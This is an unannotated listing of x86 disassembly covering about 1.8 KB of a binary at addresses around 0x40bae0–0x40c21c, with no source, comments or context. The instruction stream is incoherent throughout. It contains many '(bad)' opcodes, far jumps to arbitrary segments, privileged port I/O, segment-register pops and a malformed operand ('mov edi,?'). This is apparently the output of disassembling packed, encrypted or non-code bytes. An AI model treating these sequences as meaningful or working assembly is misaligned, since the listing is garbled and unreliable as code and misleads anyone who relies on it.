  40badf:	(bad)  
  40bae0:	push   esi
  40bae1:	or     BYTE PTR [esi+0x4a],ch
  40bae4:	out    dx,eax
  40bae5:	mov    ebp,0x3570439a
  40baea:	sti    
  40baeb:	sbb    al,0x77
  40baed:	int    0xe9
  40baef:	adc    dh,bl
  40baf1:	jmp    0x30f0:0xe7723306
  40baf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baf9:	lock dec esi
  40bafb:	sbb    BYTE PTR [edi],bh
  40bafd:	daa    
  40bafe:	or     DWORD PTR [esi],eax
  40bb00:	xchg   ebx,eax
  40bb01:	dec    eax
  40bb02:	cmp    DWORD PTR [ebx-0x6a8025fc],edi
  40bb08:	sti    
  40bb09:	add    esp,DWORD PTR [ebx+ebp*1-0x14b742e1]
  40bb10:	xor    DWORD PTR [esi-0x5245ce25],esi
  40bb16:	xchg   ebx,eax
  40bb17:	outs   dx,DWORD PTR ds:[esi]
  40bb18:	(bad)  
  40bb19:	jg     0x40bab8
  40bb1b:	mov    ah,ah
  40bb1d:	adc    DWORD PTR [edx],ebp
  40bb1f:	(bad)  
  40bb20:	xor    eax,0xb07a9b93
  40bb25:	add    BYTE PTR [edi+0x62bc29e],al
  40bb2b:	jnp    0x40bb31
  40bb2d:	lea    esp,[edi+eiz*4]
  40bb30:	adc    ah,ah
  40bb32:	jmp    0x40bad6
  40bb34:	jp     0x40bb12
  40bb36:	dec    eax
  40bb37:	iret   
  40bb38:	fdivr  DWORD PTR [ecx]
  40bb3a:	icebp  
  40bb3b:	aad    0xf5
  40bb3d:	xchg   edi,eax
  40bb3e:	mov    BYTE PTR [edi],ah
  40bb40:	inc    ecx
  40bb41:	and    al,0x96
  40bb43:	adc    DWORD PTR [edx-0x4974938f],ebp
  40bb49:	les    esp,FWORD PTR [edx-0x13]
  40bb4c:	fwait
  40bb4d:	popf   
  40bb4e:	lods   al,BYTE PTR ds:[esi]
  40bb4f:	scas   al,BYTE PTR es:[edi]
  40bb50:	ficomp WORD PTR [edx+ecx*2]
  40bb53:	daa    
  40bb54:	lahf   
  40bb55:	mov    dh,0x6
  40bb57:	pop    ss
  40bb58:	les    ebp,FWORD PTR [eax]
  40bb5a:	aas    
  40bb5b:	sahf   
  40bb5c:	test   DWORD PTR [edx+0x60],ebp
  40bb5f:	jno    0x40bb3e
  40bb61:	dec    ecx
  40bb62:	ja     0x40bafb
  40bb64:	retf   0x2447
  40bb67:	and    BYTE PTR [edi-0x2a23838e],dh
  40bb6d:	das    
  40bb6e:	adc    edi,ecx
  40bb70:	enter  0xa2b9,0xee
  40bb74:	ins    BYTE PTR es:[edi],dx
  40bb75:	aam    0x68
  40bb77:	or     BYTE PTR [ebx+0x36],dh
  40bb7a:	lods   eax,DWORD PTR ds:[esi]
  40bb7b:	push   0x67e5a682
  40bb80:	mov    cl,0x15
  40bb82:	test   DWORD PTR [esi+eiz*8+0x7c378982],edx
  40bb89:	ss pop es
  40bb8b:	ja     0x40bb1e
  40bb8d:	mul    DWORD PTR [eax+0x7]
  40bb90:	dec    ebp
  40bb92:	popf   
  40bb93:	cmp    BYTE PTR [ebp+ebp*4-0x2f],ah
  40bb97:	rcl    DWORD PTR [edi+0x4886e9f8],0x7b
  40bb9e:	dec    edi
  40bb9f:	ret    0xc83c
  40bba2:	add    eax,0x48210351
  40bba7:	sar    edx,1
  40bba9:	xchg   ebx,ebp
  40bbab:	dec    esi
  40bbac:	mov    ah,0xd3
  40bbae:	adc    BYTE PTR [edx-0x7075482c],ch
  40bbb4:	sub    eax,0xc9aa1acb
  40bbb9:	mov    ecx,0xde5e3b0d
  40bbbe:	cld    
  40bbbf:	xchg   esi,eax
  40bbc0:	shl    BYTE PTR [ecx],cl
  40bbc2:	mov    eax,ds:0x6d5192b6
  40bbc7:	jmp    0x40bbce
  40bbc9:	outs   dx,BYTE PTR ds:[esi]
  40bbca:	daa    
  40bbcb:	(bad)
  40bbce:	loop   0x40bb6b
  40bbd0:	cld    
  40bbd1:	into   
  40bbd2:	jmp    0x4c55:0x35e3d08c
  40bbd9:	sbb    DWORD PTR [esi-0x2d],esi
  40bbdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbdd:	sub    ax,0x39b2
  40bbe1:	mov    al,ds:0x341aae3b
  40bbe6:	jns    0x40bbd1
  40bbe8:	je     0x40bc12
  40bbea:	fucomip st,st(6)
  40bbec:	add    al,0x86
  40bbee:	mov    BYTE PTR [ecx-0x6b],ch
  40bbf1:	adc    esi,0x5e
  40bbf4:	pushf  
  40bbf5:	addr16 not esi
  40bbf8:	and    ebx,DWORD PTR [esi-0x5a]
  40bbfb:	mov    ch,0xf9
  40bbfd:	pushf  
  40bbfe:	sub    eax,DWORD PTR [ecx]
  40bc00:	sar    BYTE PTR [ecx],cl
  40bc02:	pop    edi
  40bc03:	leave  
  40bc04:	fistp  WORD PTR [edx]
  40bc06:	jmp    0x59f1:0x958e6d92
  40bc0d:	and    ebx,0xa2e5cadf
  40bc13:	pop    edi
  40bc14:	lods   al,BYTE PTR ds:[esi]
  40bc15:	add    eax,DWORD PTR [edx]
  40bc17:	adc    al,0x97
  40bc19:	xor    esp,eax
  40bc1b:	add    esp,DWORD PTR [edi+0x479f0135]
  40bc21:	add    dl,cl
  40bc23:	pop    ss
  40bc24:	mov    ah,0xc4
  40bc26:	xchg   esp,eax
  40bc27:	shl    DWORD PTR [edi-0x3dd04fee],cl
  40bc2d:	rcr    esp,1
  40bc2f:	add    DWORD PTR [ebx],esi
  40bc31:	xchg   edx,eax
  40bc32:	pop    ss
  40bc33:	jg     0x40bc65
  40bc35:	data16 loop 0x40bca8
  40bc38:	jecxz  0x40bbfb
  40bc3a:	xor    al,0x7f
  40bc3c:	test   esi,eax
  40bc3e:	inc    edi
  40bc3f:	fcomip st,st(6)
  40bc41:	sahf   
  40bc42:	(bad)  
  40bc43:	mov    edi,edx
  40bc45:	xchg   ecx,eax
  40bc46:	pusha  
  40bc47:	xor    DWORD PTR [edx],ebx
  40bc49:	hlt    
  40bc4a:	jb     0x40bc5a
  40bc4c:	push   0x16f0c8e9
  40bc51:	icebp  
  40bc52:	test   al,0xcb
  40bc54:	mov    WORD PTR [ecx+0x68c0c5e0],fs
  40bc5a:	xlat   BYTE PTR ds:[ebx]
  40bc5b:	cmp    ecx,DWORD PTR [ecx+0x76]
  40bc5e:	adc    cl,BYTE PTR [ebx]
  40bc60:	cld    
  40bc61:	mov    dh,0x8a
  40bc63:	sub    DWORD PTR [edi-0x8],esp
  40bc66:	jns    0x40bc15
  40bc68:	pop    es
  40bc69:	and    al,0xcd
  40bc6b:	hlt    
  40bc6c:	pcmpeqw mm6,QWORD PTR [ecx-0x14]
  40bc70:	jno    0x40bc38
  40bc72:	pushf  
  40bc73:	loop   0x40bcf3
  40bc75:	popf   
  40bc76:	and    al,0x52
  40bc78:	push   0x236b7dc6
  40bc7d:	inc    esi
  40bc7e:	aam    0x40
  40bc80:	or     ch,cl
  40bc82:	push   edx
  40bc83:	and    eax,0x50526208
  40bc88:	pop    esp
  40bc89:	cmp    esp,DWORD PTR ds:0x1f222e3d
  40bc8f:	pop    edi
  40bc90:	xchg   ecx,eax
  40bc91:	jg     0x40bcb4
  40bc93:	or     BYTE PTR [edi],dl
  40bc95:	iret   
  40bc96:	cmc    
  40bc97:	ja     0x40bc94
  40bc99:	mov    al,ds:0x412999ca
  40bc9e:	(bad)  
  40bc9f:	lock or DWORD PTR [edx],ecx
  40bca2:	and    ch,BYTE PTR [edi]
  40bca4:	mov    BYTE PTR [ebx+0x74],bh
  40bca7:	dec    edi
  40bca8:	les    esi,FWORD PTR [ebx+0xc]
  40bcab:	dec    esi
  40bcac:	push   cs
  40bcad:	add    bh,BYTE PTR [eax]
  40bcaf:	test   BYTE PTR [ecx-0x3096f890],dh
  40bcb5:	dec    esi
  40bcb6:	fucom  st(1)
  40bcb8:	fcomp  DWORD PTR [edx+ebp*1+0x1e]
  40bcbc:	enter  0x489c,0x65
  40bcc0:	inc    esi
  40bcc1:	sahf   
  40bcc2:	ret    
  40bcc3:	call   DWORD PTR [edi]
  40bcc5:	(bad)  
  40bcc6:	shl    BYTE PTR ds:0xf61380d6,cl
  40bccc:	inc    eax
  40bccd:	xchg   edi,eax
  40bcce:	lock fdivr DWORD PTR es:[ebx+ebp*8+0x266a5d47]
  40bcd7:	pop    ebp
  40bcd8:	stos   BYTE PTR es:[edi],al
  40bcd9:	or     esi,DWORD PTR [eax-0x52a4b404]
  40bcdf:	mov    dl,0x89
  40bce1:	ins    BYTE PTR es:[edi],dx
  40bce2:	retf   0xf8b8
  40bce5:	outs   dx,DWORD PTR ds:[esi]
  40bce6:	or     eax,DWORD PTR [esi]
  40bce8:	mov    ah,0x39
  40bcea:	and    eax,0x8a469edc
  40bcef:	mov    dh,0x5d
  40bcf1:	add    bh,BYTE PTR [edx+0x45]
  40bcf4:	sbb    DWORD PTR [ebp-0x1d498331],0xff237431
  40bcfe:	xor    bl,bh
  40bd00:	fsubr  DWORD PTR [ebp+0x1d]
  40bd03:	xchg   ecx,eax
  40bd04:	dec    edx
  40bd05:	mov    al,bl
  40bd07:	and    DWORD PTR [eax+ebp*2],esi
  40bd0a:	call   0xfc59:0xc3ab5911
  40bd11:	mov    al,0x19
  40bd13:	xor    BYTE PTR [ebx+0x49b0c052],dh
  40bd19:	(bad)  
  40bd1a:	push   eax
  40bd1b:	push   ss
  40bd1c:	int3   
  40bd1d:	xor    al,0xed
  40bd1f:	cmp    al,0xdf
  40bd21:	jne    0x40bcd9
  40bd23:	test   ecx,eax
  40bd25:	sub    BYTE PTR [eax+edi*8-0x65],ah
  40bd29:	dec    edx
  40bd2a:	push   esi
  40bd2b:	mov    bl,BYTE PTR [ebx]
  40bd2d:	jl     0x40bd21
  40bd2f:	adc    al,0x7c
  40bd31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd32:	pop    ds
  40bd33:	xchg   edx,eax
  40bd34:	mov    ds:0x9bb458cc,eax
  40bd39:	fs inc esp
  40bd3b:	hlt    
  40bd3c:	xor    al,0xc9
  40bd3e:	or     eax,0xe0e8042b
  40bd43:	dec    eax
  40bd44:	push   esi
  40bd45:	repnz xor esi,DWORD PTR [eax-0x20]
  40bd49:	xor    al,0xe2
  40bd4b:	mov    eax,ds:0x7c0d16ff
  40bd50:	mov    ebp,0xc3e86233
  40bd55:	or     eax,0xdbb55d0f
  40bd5a:	nop
  40bd5b:	push   ds
  40bd5c:	dec    esp
  40bd5d:	fstp   DWORD PTR [edi-0x4713a7f1]
  40bd63:	and    al,0xc4
  40bd65:	mov    bl,0x12
  40bd67:	(bad)  
  40bd68:	cmp    eax,0xf2b339a5
  40bd6d:	cld    
  40bd6e:	outs   dx,BYTE PTR ds:[esi]
  40bd6f:	cmc    
  40bd70:	neg    DWORD PTR [eax+edi*2-0x47]
  40bd74:	inc    ebp
  40bd75:	fcmovnu st,st(6)
  40bd77:	rcl    BYTE PTR [esi-0x6a],cl
  40bd7a:	fstp   TBYTE PTR [ecx-0x21]
  40bd7d:	sub    BYTE PTR [ebx],dl
  40bd7f:	clc    
  40bd80:	xchg   esp,eax
  40bd81:	loop   0x40bdc3
  40bd83:	je     0x40bd52
  40bd85:	push   es
  40bd86:	xlat   BYTE PTR ds:[ebx]
  40bd87:	in     eax,0x83
  40bd89:	jne    0x40bddb
  40bd8b:	xchg   ebp,eax
  40bd8c:	xchg   ebx,eax
  40bd8d:	lock mov cl,0xa6
  40bd90:	xchg   edi,eax
  40bd91:	xor    DWORD PTR [ecx+0x77],0x48
  40bd95:	xchg   edx,eax
  40bd96:	bound  ebp,QWORD PTR [edx]
  40bd98:	mov    ecx,0x252fff59
  40bd9d:	inc    esp
  40bd9e:	add    BYTE PTR [ecx-0x12],bh
  40bda1:	sub    DWORD PTR [ebx],ecx
  40bda3:	xchg   ebp,eax
  40bda4:	fdiv   QWORD PTR [ebx+0xc09d788]
  40bdaa:	push   ebx
  40bdab:	in     al,0x7f
  40bdad:	mov    ch,0xfd
  40bdaf:	push   edx
  40bdb0:	adc    ebp,DWORD PTR [eax+0x4c6dad9e]
  40bdb6:	(bad)  
  40bdb8:	les    esp,FWORD PTR [ebx-0x56]
  40bdbb:	dec    ebp
  40bdbc:	ja     0x40be0c
  40bdbe:	imul   eax,DWORD PTR ds:0xecbd0443,0x1a
  40bdc5:	test   al,0x26
  40bdc7:	aad    0x1a
  40bdc9:	jg     0x40bd7f
  40bdcb:	sbb    DWORD PTR [ecx-0xfb0623c],0x12dc1a41
  40bdd5:	push   0xffffff92
  40bdd7:	lock pusha 
  40bdd9:	inc    ebx
  40bdda:	js     0x40bd99
  40bddc:	int    0x11
  40bdde:	mov    BYTE PTR [esi+0x5a9bf68c],ch
  40bde4:	jge    0x40bd87
  40bde6:	push   ds
  40bde7:	pusha  
  40bde8:	out    dx,al
  40bde9:	push   edx
  40bdea:	xchg   eax,ebp
  40bdec:	and    al,0x10
  40bdee:	outs   dx,DWORD PTR ds:[esi]
  40bdef:	inc    ebx
  40bdf0:	int3   
  40bdf1:	fwait
  40bdf2:	lock push 0x37
  40bdf5:	not    BYTE PTR [edx+0x1546da3d]
  40bdfb:	dec    ebx
  40bdfc:	mov    bh,ch
  40bdfe:	fdiv   DWORD PTR [esi]
  40be00:	sub    BYTE PTR [ecx+0x54c17885],dh
  40be06:	ret    
  40be07:	jno    0x40be02
  40be09:	pop    ebx
  40be0a:	dec    ecx
  40be0b:	fwait
  40be0c:	lock and DWORD PTR [esi+0x46],0xffffffad
  40be11:	and    BYTE PTR [edx],al
  40be13:	cmp    DWORD PTR [ecx],esp
  40be15:	daa    
  40be16:	push   ebx
  40be17:	adc    DWORD PTR [edi],ecx
  40be19:	mov    edi,?
  40be1b:	xor    al,0xe9
  40be1d:	mov    edi,0x66543235
  40be22:	xor    ebx,esp
  40be24:	push   ebx
  40be25:	and    edx,ebp
  40be27:	retf   
  40be28:	xchg   BYTE PTR [ebx-0x2d1728e0],al
  40be2e:	push   eax
  40be2f:	push   edi
  40be30:	push   eax
  40be31:	jmp    0x40be9f
  40be33:	or     DWORD PTR [esi+0x74],ecx
  40be36:	fstp   QWORD PTR [ecx]
  40be38:	jl     0x40be5e
  40be3a:	dec    DWORD PTR cs:[ebx+0x15]
  40be3e:	cmp    bl,BYTE PTR [esi+ecx*2]
  40be41:	and    BYTE PTR [esp+ebp*1],0x11
  40be45:	ja     0x40be9e
  40be47:	inc    ebx
  40be48:	pop    esi
  40be49:	add    bl,BYTE PTR [eax+0x3fb6934a]
  40be4f:	mov    ebx,0x441aa65e
  40be54:	cmp    cl,BYTE PTR [eax]
  40be56:	out    0x41,al
  40be58:	lock lock sbb ebp,DWORD PTR [esi+edi*4-0x765e2b71]
  40be61:	and    BYTE PTR [ebx],bh
  40be63:	mov    edx,0xe8997e42
  40be68:	clc    
  40be69:	jne    0x40be52
  40be6b:	and    BYTE PTR [ebp+edx*8-0x62],0x12
  40be70:	push   0xffffffcf
  40be72:	pop    ecx
  40be73:	pop    ds
  40be74:	and    eax,0x59538689
  40be79:	inc    ecx
  40be7a:	sub    al,0x69
  40be7c:	rcl    DWORD PTR [ebx-0x6c793f17],1
  40be82:	mov    ds:0x66e8ba6e,eax
  40be87:	loop   0x40be9e
  40be89:	loop   0x40be5d
  40be8b:	mov    ecx,0x23a6bc87
  40be90:	inc    edi
  40be91:	enter  0x8d93,0x37
  40be95:	fild   WORD PTR [eax+ebp*1-0x2]
  40be99:	pop    ss
  40be9a:	mov    esi,0xc2fc77b5
  40be9f:	pop    edi
  40bea0:	dec    ebp
  40bea1:	push   ss
  40bea2:	xchg   ebx,eax
  40bea3:	out    0x24,al
  40bea5:	or     DWORD PTR [eax+0x68c5a609],esi
  40beab:	inc    BYTE PTR [ecx]
  40bead:	call   0xf56c:0x58d0aedf
  40beb4:	mov    eax,0x74f10771
  40beb9:	fcom   DWORD PTR [ebx-0x23]
  40bebc:	jb     0x40bf3d
  40bebe:	js     0x40be8e
  40bec0:	mov    dh,0x66
  40bec2:	fadd   QWORD PTR [ecx-0x52]
  40bec5:	push   es
  40bec6:	mov    edi,DWORD PTR [eax]
  40bec8:	arpl   WORD PTR [ecx+0x7f],dx
  40becb:	leave  
  40becc:	cmp    eax,0xc022c11b
  40bed1:	test   DWORD PTR [esi-0x53],edx
  40bed4:	repz jae 0x40be87
  40bed7:	in     eax,dx
  40bed8:	loope  0x40bf28
  40beda:	pop    eax
  40bedb:	inc    eax
  40bedc:	imul   ebp,eax,0xffffffcb
  40bedf:	push   esi
  40bee0:	cs mov ch,0x72
  40bee3:	sbb    BYTE PTR [ebx+0x18d596f4],dh
  40bee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40beea:	sti    
  40beeb:	loop   0x40bf4a
  40beed:	add    DWORD PTR [esi+0x29364c31],edx
  40bef3:	pushf  
  40bef4:	push   0xffffffdb
  40bef6:	push   ecx
  40bef7:	inc    esp
  40bef8:	fimul  DWORD PTR [edi]
  40befa:	das    
  40befb:	hlt    
  40befc:	imul   edx,DWORD PTR [edx-0x11],0xffffff95
  40bf00:	inc    esi
  40bf01:	test   BYTE PTR [ecx+0x63],al
  40bf04:	ffreep st(5)
  40bf06:	dec    ecx
  40bf07:	cld    
  40bf08:	inc    eax
  40bf09:	push   edx
  40bf0a:	add    al,0x48
  40bf0c:	mov    ebx,0xb0f3acd9
  40bf11:	nop
  40bf12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf13:	sub    BYTE PTR [edx-0xccb3a8a],bl
  40bf19:	je     0x40bece
  40bf1b:	jmp    DWORD PTR [edx+0x8ccb9e5]
  40bf21:	cmp    ch,dl
  40bf23:	inc    edx
  40bf24:	lds    eax,FWORD PTR ds:0xedef1419
  40bf2a:	retf   0x8804
  40bf2d:	cmp    BYTE PTR [ebx],al
  40bf2f:	mov    ds:0xc4998d5c,al
  40bf34:	fidiv  DWORD PTR [ecx]
  40bf36:	and    al,0x0
  40bf38:	adc    BYTE PTR [edx+ebx*1],dh
  40bf3b:	nop
  40bf3c:	xchg   BYTE PTR [esi],ch
  40bf3e:	push   esi
  40bf3f:	jae    0x40bee7
  40bf41:	not    BYTE PTR [edx-0x29b5d3a6]
  40bf47:	jno    0x40bf62
  40bf49:	nop
  40bf4a:	pop    ds
  40bf4b:	pop    ebp
  40bf4c:	addr16 int3 
  40bf4e:	in     al,dx
  40bf4f:	out    0xef,al
  40bf51:	xor    BYTE PTR [edi+ebx*4-0x715e74ca],0x9c
  40bf59:	mov    dh,0x91
  40bf5b:	je     0x40bf0e
  40bf5d:	(bad)  
  40bf5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bf60:	mov    ah,0x86
  40bf62:	or     DWORD PTR [ebp+0x63],ebx
  40bf65:	dec    ebx
  40bf66:	push   eax
  40bf67:	pushf  
  40bf68:	xchg   ebx,eax
  40bf69:	(bad)  
  40bf6a:	fst    DWORD PTR [eax-0x52fd9e95]
  40bf70:	test   WORD PTR [edx+0x70],bx
  40bf74:	(bad)  
  40bf75:	sbb    eax,0x3af90f1
  40bf7a:	ror    BYTE PTR [ecx+0x4e],0xa0
  40bf7e:	gs pop ss
  40bf80:	xor    ah,ch
  40bf82:	jg     0x40bfcc
  40bf84:	lock sub eax,0x8756b488
  40bf8a:	xor    BYTE PTR [edi-0x47],al
  40bf8d:	jl     0x40bf28
  40bf8f:	sar    DWORD PTR [edx+ebp*4],1
  40bf92:	pop    eax
  40bf93:	(bad)  
  40bf94:	jb     0x40bfaa
  40bf96:	pop    ss
  40bf97:	pop    ds
  40bf98:	pop    esi
  40bf99:	scas   al,BYTE PTR es:[edi]
  40bf9a:	dec    esp
  40bf9b:	jno    0x40bf3e
  40bf9d:	mov    edx,0x43fbdbb2
  40bfa2:	js     0x40bf64
  40bfa4:	dec    eax
  40bfa5:	sub    eax,DWORD PTR [esi-0x14]
  40bfa8:	xchg   ebp,eax
  40bfa9:	xchg   ebp,eax
  40bfaa:	mov    dh,0x9d
  40bfac:	mov    ah,0x44
  40bfae:	sbb    DWORD PTR [edx-0x19b94c82],edi
  40bfb4:	pushf  
  40bfb5:	in     al,dx
  40bfb6:	xchg   ebp,eax
  40bfb7:	popa   
  40bfb8:	dec    edx
  40bfb9:	inc    esp
  40bfba:	test   BYTE PTR [ebx-0x19],ch
  40bfbd:	xchg   ecx,eax
  40bfbe:	push   ebx
  40bfbf:	mov    eax,0xe88b259e
  40bfc4:	popf   
  40bfc5:	stos   BYTE PTR es:[edi],al
  40bfc6:	jmp    0x40bf63
  40bfc8:	in     eax,dx
  40bfc9:	in     eax,0x31
  40bfcb:	xor    DWORD PTR [ebp+0x71],ebx
  40bfce:	pop    edx
  40bfcf:	dec    ebp
  40bfd0:	ins    BYTE PTR es:[edi],dx
  40bfd1:	in     eax,dx
  40bfd2:	mov    ah,0x74
  40bfd4:	in     eax,dx
  40bfd5:	int3   
  40bfd6:	das    
  40bfd7:	cld    
  40bfd8:	pop    ebp
  40bfd9:	mov    eax,ds:0x3410d265
  40bfde:	fstp   TBYTE PTR [eax]
  40bfe0:	lds    esp,FWORD PTR [ebp+0x7172baaf]
  40bfe6:	mov    ebx,0x39b622df
  40bfeb:	aam    0xe7
  40bfed:	arpl   WORD PTR [ebx],sp
  40bfef:	pop    esi
  40bff0:	fisubr WORD PTR [edx+0x149c24ed]
  40bff6:	shl    DWORD PTR [esi+0x6cbfe563],cl
  40bffc:	adc    DWORD PTR [edi],0x27512308
  40c002:	cmp    BYTE PTR [bp-0x70],bh
  40c006:	push   edi
  40c007:	scas   eax,DWORD PTR es:[edi]
  40c008:	push   ebp
  40c009:	imul   ebp,DWORD PTR [eax],0xffffffbf
  40c00c:	inc    edi
  40c00d:	call   0x8b40e540
  40c012:	(bad)  
  40c013:	sub    al,0x63
  40c015:	or     al,0x96
  40c017:	jg     0x40bfac
  40c019:	aaa    
  40c01a:	lds    ebp,FWORD PTR [edx-0x37]
  40c01d:	call   0xa669cb5b
  40c022:	jo     0x40c094
  40c024:	sbb    edx,DWORD PTR [ebp-0x59]
  40c027:	xor    DWORD PTR [ebp+0x4721dda3],ebp
  40c02d:	into   
  40c02e:	aam    0x5e
  40c030:	and    BYTE PTR [edx],cl
  40c032:	(bad)  
  40c033:	sbb    DWORD PTR [ecx-0x655522aa],ebp
  40c039:	ds imul ecx,ebp,0x5d83e039
  40c040:	mov    ds:0x8d39fb0f,al
  40c045:	adc    cl,0x6d
  40c048:	add    DWORD PTR [edx+0x62a0d015],edx
  40c04e:	xor    esi,DWORD PTR [eax]
  40c050:	xor    DWORD PTR [eax-0x21],esp
  40c053:	inc    edi
  40c054:	jg     0x40c07a
  40c056:	mov    ch,0x94
  40c058:	shl    BYTE PTR [eax-0xa85cdd4],0xf1
  40c05f:	in     eax,0xdd
  40c061:	push   ds
  40c062:	clc    
  40c063:	mov    edx,es
  40c065:	adc    al,0xea
  40c067:	adc    BYTE PTR [ebp-0x2c],bl
  40c06a:	rcl    DWORD PTR [ecx-0x40],0x2c
  40c06e:	jae    0x40c0a1
  40c070:	test   al,0x83
  40c072:	sbb    ah,BYTE PTR [ebx-0x79]
  40c075:	lods   al,BYTE PTR ds:[esi]
  40c076:	nop
  40c077:	in     eax,0x0
  40c079:	retf   
  40c07a:	push   edi
  40c07b:	outs   dx,DWORD PTR ds:[esi]
  40c07c:	and    BYTE PTR [ebx],bl
  40c07e:	fcomp  QWORD PTR [eax]
  40c080:	test   al,0x36
  40c082:	mov    gs,WORD PTR [edi-0x50]
  40c085:	push   0xffffffb7
  40c087:	leave  
  40c088:	fstp   st(1)
  40c08a:	rol    DWORD PTR [ebx-0x31],0xb0
  40c08e:	jns    0x40c0e1
  40c090:	in     al,dx
  40c091:	test   eax,0x53372e4f
  40c096:	sar    DWORD PTR [ebp+0x70c4a99],1
  40c09c:	or     DWORD PTR [ebx-0x7f24521d],0x54
  40c0a3:	scas   al,BYTE PTR es:[edi]
  40c0a4:	push   edi
  40c0a5:	test   eax,0x726ad864
  40c0aa:	adc    DWORD PTR [edx+esi*8-0x57ee2a79],edi
  40c0b1:	xor    eax,0x8206a5ab
  40c0b6:	fmul   DWORD PTR [ebp+ebx*4-0x29]
  40c0ba:	xor    BYTE PTR [esi],0x67
  40c0bd:	pmulhuw mm0,QWORD PTR [edi-0x7588d58a]
  40c0c4:	mov    edi,0xd8618bbe
  40c0c9:	les    esi,FWORD PTR [ecx+0x53]
  40c0cc:	fcom   st(0)
  40c0ce:	xor    BYTE PTR ds:0x99be7ae6,bl
  40c0d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0d5:	xor    al,0x9c
  40c0d7:	add    ecx,esi
  40c0d9:	sub    ecx,DWORD PTR [eax]
  40c0db:	daa    
  40c0dc:	add    DWORD PTR [esp+0x1e],edi
  40c0e0:	or     DWORD PTR [esi],0x76
  40c0e3:	sub    al,0x1a
  40c0e5:	push   cs
  40c0e6:	dec    esi
  40c0e7:	stos   DWORD PTR es:[edi],eax
  40c0e8:	loop   0x40c0dc
  40c0ea:	cmp    ebp,ebp
  40c0ec:	mov    esp,esi
  40c0ee:	test   al,0x67
  40c0f0:	imul   esi,DWORD PTR [ecx+esi*4-0x4e],0x6e74716c
  40c0f8:	mov    cl,dh
  40c0fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0fb:	test   DWORD PTR [edi],esi
  40c0fd:	push   0xffffff8f
  40c0ff:	pop    edx
  40c100:	lods   al,BYTE PTR ds:[esi]
  40c101:	mov    bl,0x4f
  40c103:	mov    bh,0x92
  40c105:	adc    edi,edi
  40c107:	(bad)  
  40c108:	hlt    
  40c109:	clc    
  40c10a:	add    ah,BYTE PTR [edi-0x49ed9013]
  40c110:	xchg   ecx,eax
  40c111:	(bad)  
  40c112:	popa   
  40c113:	stos   BYTE PTR es:[edi],al
  40c114:	bound  esp,QWORD PTR [ecx-0x6433e0bc]
  40c11a:	xor    ebp,DWORD PTR [edi-0xb8c64b3]
  40c120:	mov    bh,0x4
  40c122:	mov    ebp,0x1f49c633
  40c127:	and    BYTE PTR [ebp+0x48a7bc2f],ah
  40c12d:	sbb    BYTE PTR [ebx-0x1d],bh
  40c130:	mov    al,0x5e
  40c132:	add    BYTE PTR [eax],cl
  40c134:	dec    esi
  40c135:	mov    ebx,0x68cec038
  40c13a:	ja     0x40c192
  40c13c:	dec    ecx
  40c13d:	(bad)  
  40c13e:	pop    ebx
  40c13f:	mov    ds:0xad5d7004,al
  40c144:	push   ebx
  40c145:	or     edi,ebx
  40c147:	cli    
  40c148:	jmp    0xf8befa35
  40c14d:	mov    ebp,0x16eaeb49
  40c152:	fwait
  40c153:	(bad)  
  40c154:	mov    cl,0x89
  40c156:	push   esp
  40c157:	push   ecx
  40c158:	popa   
  40c159:	(bad)  
  40c15a:	or     al,0x6
  40c15c:	sbb    BYTE PTR [ecx],ch
  40c15e:	inc    edi
  40c15f:	mov    esi,0xef0d1e84
  40c164:	push   0x960b5187
  40c169:	repnz (bad) 
  40c16b:	push   edx
  40c16c:	adc    BYTE PTR [ebp-0x467f95ed],ch
  40c172:	pop    eax
  40c173:	fcom   st(0)
  40c175:	pop    edx
  40c176:	mov    eax,ds:0xebfef0e8
  40c17b:	jo     0x40c17c
  40c17d:	fwait
  40c17e:	mov    ebx,0x86214938
  40c183:	jp     0x40c143
  40c185:	int3   
  40c186:	cmp    DWORD PTR [ecx-0x15],edx
  40c189:	test   eax,0x8f0d3110
  40c18e:	popf   
  40c18f:	cmp    DWORD PTR [ebx-0x7e],esi
  40c192:	ror    bl,0x50
  40c195:	mov    ecx,0x50681e8c
  40c19a:	pop    edx
  40c19b:	cli    
  40c19c:	and    bl,bl
  40c19e:	and    eax,0x5b9dd56d
  40c1a3:	push   ebp
  40c1a4:	sub    ebp,DWORD PTR [ebx+0x4131edd9]
  40c1aa:	push   es
  40c1ab:	sbb    BYTE PTR [ebp+0x16c9751],ch
  40c1b1:	sbb    al,BYTE PTR [edi-0x2524b01b]
  40c1b7:	(bad)  
  40c1b8:	adc    DWORD PTR [eax+eiz*1-0x54d528c6],ebx
  40c1bf:	pop    edx
  40c1c0:	mov    dl,ah
  40c1c2:	repnz mov ah,0xe6
  40c1c5:	pop    ebx
  40c1c6:	push   edx
  40c1c7:	mov    ds:0x326b895e,eax
  40c1cc:	push   es
  40c1cd:	(bad)  
  40c1ce:	pop    ebx
  40c1cf:	mov    ebp,0xaf26f739
  40c1d4:	ins    DWORD PTR es:[edi],dx
  40c1d5:	fldcw  WORD PTR [eax+0x2acee3c5]
  40c1db:	mov    edx,0x651d25e4
  40c1e0:	cmp    esi,ebp
  40c1e2:	fstp   QWORD PTR ds:0xd7be8762
  40c1e8:	push   cs
  40c1e9:	rcl    DWORD PTR [esp+edx*1+0xd],cl
  40c1ed:	jo     0x40c1e0
  40c1ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1f0:	adc    edi,DWORD PTR [ebx-0x12b981a7]
  40c1f6:	pop    ecx
  40c1f7:	fnstcw WORD PTR [esi-0xeac549b]
  40c1fd:	loope  0x40c247
  40c1ff:	add    dl,BYTE PTR [esi]
  40c201:	loop   0x40c185
  40c203:	fsub   QWORD PTR [ebx+0x6d]
  40c206:	int    0x28
  40c208:	(bad)  
  40c209:	loopne 0x40c1b9
  40c20b:	cmp    cl,cl
  40c20d:	pop    es
  40c20e:	cwde   
  40c20f:	sbb    BYTE PTR [ebp-0x2c],dh
  40c212:	dec    ebx
  40c213:	ins    DWORD PTR es:[edi],dx
  40c214:	test   al,0x68
  40c216:	mov    esp,0xa811ad41
  40c21b:	out    dx,al
  40c21c:	aaa    
